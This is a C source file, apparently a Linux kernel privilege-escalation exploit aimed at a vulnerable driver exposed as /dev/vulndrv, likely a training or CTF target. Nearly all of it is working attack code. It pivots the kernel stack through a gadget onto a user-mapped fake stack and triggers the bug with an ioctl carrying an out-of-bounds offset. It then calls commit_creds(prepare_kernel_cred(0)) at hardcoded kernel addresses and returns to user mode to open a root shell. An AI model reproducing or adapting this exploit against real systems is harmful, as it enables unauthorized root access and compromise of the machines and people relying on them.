#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <poll.h>
#include <sys/prctl.h>
#include <stdint.h>
#include <assert.h>

#define DEVICE_PATH "/dev/vulndrv"

size_t user_cs, user_ss,user_rflags, user_sp ,user_gs,user_es,user_fs,user_ds;
void save_stat(){
    __asm__("mov %%cs, %0\n"
    "mov %%ss,%1\n"
    "mov %%rsp,%2\n"
    "pushfq\n"
    "pop %3\n"
    "mov %%gs,%4\n"
    "mov %%es,%5\n"
    "mov %%fs,%6\n"
    "mov %%ds,%7\n"
    ::"m"(user_cs),"m"(user_ss),"m"(user_sp),"m"(user_rflags),
    "m"(user_gs),"m"(user_es),"m"(user_fs),"m"(user_ds)
    );
    puts("[*]status has been saved.");
}

#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void*) KERNCALL ;
void (*commit_creds)(void*) KERNCALL ;
void shell(){
    if(!getuid()){
        system("/bin/sh");
    }
    else{
        puts("[*]fail to get root shell.");
        exit(0);   
    }
}
void get_root(){
    commit_creds(prepare_kernel_cred(0));
    asm(
        "push %0\n"
        "push %1\n"
        "push %2\n"
        "push %3\n"
        "push %4\n"
        "push $0\n"
        "swapgs\n"
        "pop %%rbp\n"
        "iretq\n"
        ::"m"(user_ss),"m"(user_sp),"m"(user_rflags),"m"(user_cs),"a"(&shell)
    );
}

typedef struct drv_req {
    unsigned long offset;
} drv_req;


int main(int argc, char *argv[])
{
    int fd = open(DEVICE_PATH, O_RDONLY);
    //0xffffffff818a6690: xchg eax, esp; ret 0xdaf7;
    //base = 0xffffffffa00007c0
    unsigned long base = 0xffffffffa00007c0;
    unsigned long xchg_ret = 0xffffffff818a6690;
    drv_req req;
    req.offset = (xchg_ret-base)/8;
    unsigned long fake_stack = xchg_ret & 0xffff0000;
    unsigned long fake_ret = xchg_ret & 0xffffffff;
    printf("[*]fake stack: %lx", fake_stack);
    void* mapped_addr; 
    assert((mapped_addr = mmap(fake_stack, 0x20000, 7, 0x32, 0, 0)) == fake_stack);
    unsigned long* temp = (unsigned long*)mapped_addr;
    /* without write data to the mmaped area, trigger double fault?*/
    int i = 0;
    for(i  =0; i < 0x20000/8; i++){
        if( i % (0x1000/ 8) == 0){
            *(temp + i) = 0;
        }
    }
    save_stat();
    unsigned long* payload = (unsigned long *)fake_ret;
    commit_creds = 0xffffffff81079c10;
    prepare_kernel_cred = 0xffffffff81079ec0;
    payload[0] = (unsigned long)&get_root;
    ioctl(fd, 0, &req);
    return 0;
}



